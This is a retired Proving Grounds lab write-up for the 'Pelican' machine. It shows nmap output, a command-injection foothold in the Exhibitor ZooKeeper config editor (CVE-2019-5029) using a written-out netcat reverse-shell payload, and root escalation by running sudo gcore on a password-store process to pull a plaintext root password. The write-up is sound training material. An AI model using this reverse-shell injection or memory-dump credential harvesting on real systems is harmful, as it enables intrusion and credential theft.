---
machine: Pelican
platform: Proving Grounds
category: Linux
difficulty: Medium
tags: [zookeeper, exhibitor, cve-2019-5029, sudo-gcore, memory-dump]
date: 2026-07-20
status: retired
summary: A Debian box running Samba, CUPS, and a ZooKeeper cluster manager — testing a known command-injection RCE in the ZooKeeper web supervisor for a foothold, then abusing a sudo-permitted core-dump utility to harvest a plaintext root password straight out of process memory.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[192.168.45.225]-[~/oscp/pelican]
└─$ nmap-full 192.168.125.98              
[*] Running fast port discovery on 192.168.125.98...
[*] Open ports: 22,139,445,631,2181,2222,8080,8081,34051
[*] Running full scan on 192.168.125.98...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-20 12:07 -0400
Nmap scan report for 192.168.125.98
Host is up (0.033s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
|_http-server-header: CUPS/2.2 IPP/2.1
| http-methods: 
|_  Potentially risky methods: PUT
|_http-title: Forbidden - CUPS v2.2.10
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
8080/tcp  open  http        Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
8081/tcp  open  http        nginx 1.14.2
|_http-title: Did not follow redirect to http://192.168.125.98:8080/exhibitor/v1/ui/index.html
|_http-server-header: nginx/1.14.2
34051/tcp open  java-rmi    Java RMI
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-07-20T16:07:52
|_  start_date: N/A
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2026-07-20T12:07:52-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.18 seconds

──(kali㉿kali)-[192.168.45.225]-[~/oscp/pelican]
└─$ nmap -sU -sCV -p 161 target           
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-20 12:08 -0400
Nmap scan report for target (192.168.125.98)
Host is up (0.033s latency).

PORT    STATE  SERVICE VERSION
161/udp closed snmp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds

```

This box gives us a handful of interesting results including two SSH servers, one on 22 and 2222, a samba server, CUPS v2.2.10 on 631, zookeeper (purportedly version 3.4.6) on 2181, and a webapp on 8080

We can run enum4linux to try to enumerate the samba share and attempt to feroxbust the 8080 webserver

While googling our services and versions we see this:

```text
**CVE-2019-5029 (High Severity - Exhibitor Web UI):** If you are using Exhibitor (a popular web-based supervisor for ZooKeeper) version `1.7.1` or older to manage this instance, there is a severe Remote Code Execution (RCE) command injection vulnerability in the config editor
```

We will dig into this before going further with our enumeration: https://www.exploit-db.com/exploits/48654

## Foothold

According to the exploit we can wrap arbitrary code in $() in java.env script to execute. We use $(/bin/nc -e /bin/sh 192.168.45.229 4444 &) and commit to gain a revshell as charles:

```bash
charles@pelican:/opt/zookeeper$ whoami
charles
```

We can go ahead and transfer linpeas.sh into our default /opt/zookeeper directory and retrieve the user shell from /home/charles.

## Privilege Escalation

When running sudo -l we see we can run gcore as sudo, and with some research we see that this lets us coredump processes and read the outputs. We go through the processes and we find a processes running with path `/usr/bin/password-store` with pid 494

We dump this with `sudo gcore 494` and read the log with strings:
We find `ClogKingpinInning731` in the dump, seemingly a password underneath strings talking about root.

```text
001 Password: root:
ClogKingpinInning731
```

I attempt to login to both ssh ports as root but it fails

```bash
┌──(kali㉿kali)-[~/oscp/pelican]
└─$ ssh root@192.168.133.98               
The authenticity of host '192.168.133.98 (192.168.133.98)' can't be established.
ED25519 key fingerprint is: SHA256:b8NU+7sRCToMclsR01a4d9elt1NOqyyUHKteh+I977o
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.133.98' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
root@192.168.133.98's password: 
Permission denied, please try again.
root@192.168.133.98's password:                                                                                
┌──(kali㉿kali)-[~/oscp/pelican]
└─$ ssh root@192.168.133.98 -p 2222
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
root@192.168.133.98's password: 
Permission denied, please try again.
root@192.168.133.98's password: 
```

I try `su root` and input password `ClogKingpinInning731` on the revshell and gain access to the root user:

```bash
root@pelican:~# whoami
root
```

I can harvest the root flag from `/root/proof.txt` and the box is complete
